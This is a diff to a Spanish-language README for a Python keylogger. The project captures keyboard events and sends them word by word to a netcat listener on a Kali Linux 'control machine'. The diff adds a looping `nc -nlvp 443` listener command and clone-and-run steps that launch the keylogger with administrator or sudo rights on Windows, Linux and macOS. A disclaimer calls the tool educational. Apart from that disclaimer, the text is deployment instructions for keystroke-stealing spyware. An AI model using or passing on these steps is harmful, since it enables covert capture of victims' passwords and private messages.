@@ -9,7 +9,7 @@ Técnica desarrollada en Python para el estudio de la interceptación de eventos
 ## 📸 Demostración de Funcionamiento
 El sistema valida la conectividad antes de iniciar y envía los datos palabra por palabra para optimizar el tráfico de red.
 
-| 💻 Cliente (Windows / .exe) | 🛡️ Receptor (Kali Linux / Netcat) |
+| 💻 Cliente (Windows / .py) | 🛡️ Receptor (Kali Linux / Netcat) |
 | :---: | :---: |
 | <img src="img/window.png" width="400"> | <img src="img/kali.png" width="400"> |
 
@@ -29,13 +29,21 @@ En la máquina de control (ej. Kali Linux), inicia un listener persistente que n
 ```bash
  while true; do sudo nc -nlvp 443 2>/dev/null; done
 ```
-### 2. Ejecutar el Cliente (Windows)
-Requiere Python 3.x y permisos de administrador para capturar eventos globales:
-
+### 2. Ejecutar el Cliente 
+🪟 Si usas Windows (Administrador)
 ```bash
-pip install keyboard
-python run.py
-```
+git clone https://github.com/RedShenlong/Keylogger.git 
+cd Keylogger 
+pip install keyboard 
+python keylogger.py
 
+```
+🐧 Si usas Linux o macOS
+```bash
+git clone https://github.com/RedShenlong/Keylogger.git &&
+cd Keylogger &&
+sudo pip install keyboard --break-system-packages &&
+sudo python3 keylogger.py
+```
 ## ⚠️ DESCARGO DE RESPONSABILIDAD (DISCLAIMER)
 **IMPORTANTE**: Este proyecto tiene fines estrictamente educativos y de investigación. El uso de esta herramienta para monitorizar dispositivos sin el consentimiento explícito y por escrito del propietario es una actividad ilegal. El autor no se hace responsable del uso indebido que se le pueda dar a este código.
